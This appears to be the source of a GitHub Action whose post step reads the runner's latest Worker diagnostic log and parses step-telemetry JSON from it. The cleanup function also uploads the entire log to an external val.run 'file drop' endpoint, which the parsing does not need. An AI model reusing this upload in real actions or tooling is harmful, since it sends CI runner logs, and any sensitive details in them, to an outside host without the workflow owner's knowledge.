import * as core from "@actions/core";
import * as coreCommand from "@actions/core/lib/command";
import * as stateHelper from "./state-helper";
import * as fs from "node:fs";
import * as path from "node:path";

async function run(): Promise<void> {
	console.log("run");
}

interface StepTelemetry {
	action: string;
	ref: string;
	type: string;
	stage: string;
	stepId: string;
	stepContextName: string;
	hasPreStep: boolean;
	hasPostStep: boolean;
	result: string;
	errorMessages: string[];
	executionTimeInSeconds: number;
	startTime: string;
	finishTime: string;
	displayName: string;
}

async function cleanup(): Promise<void> {
	function getLatestWorkerLog(directoryPath: string): string {
		// Get all files in the directory
		const files = fs.readdirSync(directoryPath);

		// Filter for Worker_ files and sort them by name (which includes timestamp)
		const workerFiles = files
			.filter((file) => file.startsWith("Worker_"))
			.sort()
			.reverse();

		if (workerFiles.length === 0) {
			throw new Error("No Worker log files found");
		}

		return path.join(directoryPath, workerFiles[0]);
	}

	// Main execution
	try {
		const directoryPath = "/home/runner/runners/2.320.0/_diag";
		const latestWorkerLog = getLatestWorkerLog(directoryPath);
		console.log(`Processing file: ${latestWorkerLog}`);

		const content = fs.readFileSync(latestWorkerLog, "utf-8");
		// Upload the log file content to the file drop service
		const formData = new FormData();
		formData.append("log.log", new Blob([content], { type: "text/plain" }));
		const response = await fetch(
			"https://maxm-internalfiledrop.web.val.run/upload",
			{
				method: "POST",
				body: formData,
			},
		);

		if (!response.ok) {
			throw new Error(`Upload failed with status ${response.status}`);
		}
		const telemetryData = parseLogFile(content);
		console.log("Found step telemetry entries:", telemetryData.length);
		console.log(JSON.stringify(telemetryData, null, 2));
	} catch (error) {
		console.error("Error:", error);
		process.exit(1);
	}
}

export function parseLogFile(content: string): StepTelemetry[] {
	const telemetryData: StepTelemetry[] = [];

	// Regular expression to match both the DisplayName line and telemetry entries
	const stepRegex =
		/\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}Z INFO StepsRunner\] Processing step: DisplayName='([^']+)'\s*(?:[\s\S]*?)\[\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}Z INFO ExecutionContext\] Publish step telemetry for current step (\{[\s\S]*?\}\s*\.)/gm;

	const matches = content.matchAll(stepRegex);
	for (const match of matches) {
		try {
			const displayName = match[1];
			// Remove the trailing period and parse JSON
			const jsonStr = match[2].replace(/\.\s*$/, "");
			const jsonData = JSON.parse(jsonStr);
			// Add displayName to the telemetry data
			telemetryData.push({
				...jsonData,
				displayName, // Add the displayName field
			});
		} catch (error) {
			console.error("Error parsing JSON:", error);
		}
	}

	return telemetryData;
}

// Main
if (!stateHelper.IsPost) {
	run();
} else {
	// Post
	cleanup();
}
